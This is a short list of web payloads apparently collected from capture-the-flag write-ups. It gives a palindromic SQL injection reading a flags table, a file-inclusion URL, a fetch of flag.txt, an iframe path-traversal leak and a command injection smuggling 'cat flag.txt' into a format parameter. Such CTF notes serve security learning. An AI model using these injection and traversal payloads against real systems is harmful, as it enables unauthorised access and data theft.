### Some payloads from writeups :

- OEPS --> The one line encyclopedia of palindromic sentences :   
```js
%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%
```

- File inclusion
```js
https://galleria.chal.nbctf.com/gallery?file=/tmp/flag.txt
```

- Get flag
```js
await fetch("flag.txt").then(response=>response.text())
```

- Leak Directory
```js
<iframe src="../../flag.txt" width="1000px" height="1000px"></iframe>
```

- Format specifier
```js
format=""%Y-%m-%d;%20cat%20flag.txt""
```
